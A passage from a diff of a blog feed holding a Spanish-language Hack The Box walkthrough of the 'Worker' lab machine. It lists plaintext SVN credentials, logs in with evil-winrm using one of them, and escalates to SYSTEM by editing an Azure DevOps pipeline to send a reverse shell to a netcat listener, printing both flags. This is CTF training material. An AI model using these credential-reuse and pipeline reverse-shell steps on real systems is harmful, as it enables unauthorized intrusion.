-nichin <span class="o">=</span> asifhiefh
-noahip <span class="o">=</span> player
-nuahip <span class="o">=</span> wkjdnw
-oakhol <span class="o">=</span> bxwdjhcue
-owehol <span class="o">=</span> supersecret
-paihol <span class="o">=</span> painfulcode
-parhol <span class="o">=</span> gitcommit
-pathop <span class="o">=</span> iliketomoveit
-pauhor <span class="o">=</span> nowayjose
-payhos <span class="o">=</span> icanjive
-perhou <span class="o">=</span> elvisisalive
-peyhou <span class="o">=</span> ineedvacation
-phihou <span class="o">=</span> pokemon
-quehub <span class="o">=</span> pickme
-quihud <span class="o">=</span> kindasecure
-rachul <span class="o">=</span> guesswho
-raehun <span class="o">=</span> idontknow
-ramhun <span class="o">=</span> thisis
-ranhut <span class="o">=</span> getting
-rebhyd <span class="o">=</span> rediculous
-reeinc <span class="o">=</span> iagree
-reeing <span class="o">=</span> tosomepoint
-reiing <span class="o">=</span> isthisenough
-renipr <span class="o">=</span> dummy
-rhiire <span class="o">=</span> <span class="nb">users
-</span>riairv <span class="o">=</span> canyou
-ricisa <span class="o">=</span> seewhich
-robish <span class="o">=</span> onesare
-robisl <span class="o">=</span> wolves11
-robive <span class="o">=</span> andwhich
-ronkay <span class="o">=</span> onesare
-rubkei <span class="o">=</span> the
-rupkel <span class="o">=</span> sheeps
-ryakel <span class="o">=</span> imtired
-sabken <span class="o">=</span> drjones
-samken <span class="o">=</span> aqua
-sapket <span class="o">=</span> hamburger
-sarkil <span class="o">=</span> friday
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que el único usuario de interés es <code class="language-plaintext highlighter-rouge">robisl</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir C:<span class="se">\U</span>sers<span class="se">\</span>
-<span class="nb">dir </span>C:<span class="se">\U</span>sers<span class="se">\</span>
- Volume <span class="k">in </span>drive C has no label.
- Volume Serial Number is 32D6-9041
-
- Directory of C:<span class="se">\U</span>sers
-
-2020-07-07  17:53    &lt;DIR&gt;          <span class="nb">.</span>
-2020-07-07  17:53    &lt;DIR&gt;          ..
-2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
-2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
-2020-08-18  00:33    &lt;DIR&gt;          Administrator
-2020-03-28  15:01    &lt;DIR&gt;          Public
-2020-07-22  01:11    &lt;DIR&gt;          restorer
-2020-07-08  19:22    &lt;DIR&gt;          robisl
-               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
-               8 Dir<span class="o">(</span>s<span class="o">)</span>  10459025408 bytes free
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>El usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;net user robisl
-net user robisl
-User name                    robisl
-Full Name                    Robin Islip
-Comment
-User<span class="s1">'s comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            2020-04-05 21:27:26
-Password expires             Never
-Password changeable          2020-04-05 21:27:26
-Password required            No
-User may change password     No
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   2020-08-03 12:41:02
-
-Logon hours allowed          All
-
-Local Group Memberships      *Production           *Remote Management Use
-Global Group memberships     *None
-The command completed successfully.
-
-
-W:\svnrepos\www\conf&gt;
-</span></code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<ul>
-  <li>Ahora ya nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.203 <span class="nt">-u</span> <span class="s1">'robisl'</span> <span class="nt">-p</span> <span class="s1">'wolves11'</span>
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>worker<span class="se">\r</span>obisl
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
-2ce8a9d7ff7736acc3469f7274b2006a
-</code></pre></div></div>
-
-<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
-
-<ul>
-  <li>No vemos ningún privilegio ni nada interesante.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
-
-PRIVILEGES INFORMATION
-<span class="nt">----------------------</span>
-
-Privilege Name                Description                    State
-<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all
-
-USER INFORMATION
-<span class="nt">----------------</span>
-
-User Name     SID
-<span class="o">=============</span> <span class="o">==============================================</span>
-worker<span class="se">\r</span>obisl S-1-5-21-3082756831-2119193761-3468718151-1330
-
-
-GROUP INFORMATION
-<span class="nt">-----------------</span>
-
-Group Name                             Type             SID                                            Attributes
-<span class="o">======================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">==================================================</span>
-Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
-WORKER<span class="se">\P</span>roduction                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\R</span>emote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
-BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
-Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192
-
-
-PRIVILEGES INFORMATION
-<span class="nt">----------------------</span>
-
-Privilege Name                Description                    State
-<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
-</code></pre></div></div>
-
-<ul>
-  <li>Si recordamos tenemos credenciales y si nos conectamos al <code class="language-plaintext highlighter-rouge">devops.worker.htb</code> con las credenciales son validas.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/19.png" />
-</p>
-
-<ul>
-  <li>Formamos parte del grupo <code class="language-plaintext highlighter-rouge">Build Administrators</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/20.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Podemos crear un <code class="language-plaintext highlighter-rouge">Pipeline</code>.</p>
-  </li>
-  <li>
-    <p>Después le damos en <code class="language-plaintext highlighter-rouge">PartsUnlimited</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/21.png" />
-</p>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/22.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Podemos hacer un script en YAML.</p>
-  </li>
-  <li>
-    <p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code class="language-plaintext highlighter-rouge">whoami</code> para ver quien es el que esta ejecutando el script.</p>
-  </li>
-  <li>
-    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/23.png" />
-</p>
-
-<ul>
-  <li>Así que vamos a crear una nueva rama.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/24.png" />
-</p>
-
-<ul>
-  <li>Pero obtenemos un error.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/25.png" />
-</p>
-
-<ul>
-  <li>Vemos que nos dicen sobre el <code class="language-plaintext highlighter-rouge">pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/26.png" />
-</p>
-
-<ul>
-  <li>Vamos a cambiar el <code class="language-plaintext highlighter-rouge">pool</code> y hacemos lo mismo de cambiar la rama.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/27.png" />
-</p>
-
-<ul>
-  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Run</code> vemos que funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/28.png" />
-</p>
-
-<ul>
-  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> al <code class="language-plaintext highlighter-rouge">#....</code> vemos que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/29.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Vamos a editar el <code class="language-plaintext highlighter-rouge">Pipeline</code> para hacer todo lo anterior y enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
-  </li>
-  <li>
-    <p>En mi caso volví a subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> así que nos enviamos una reverse ahora.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-</code></pre></div></div>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/30.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
-  </li>
-  <li>
-    <p>Después de que se procese todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 49935
-Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
-<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
-
-W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span><span class="nb">whoami
-whoami
-</span>nt authority<span class="se">\s</span>ystem
-
-W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<h2 id="roottxt">Root.txt</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-d3a78316ac7f36f03c0e6dd2ada48da9
-C:<span class="se">\&gt;</span>
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry></feed>
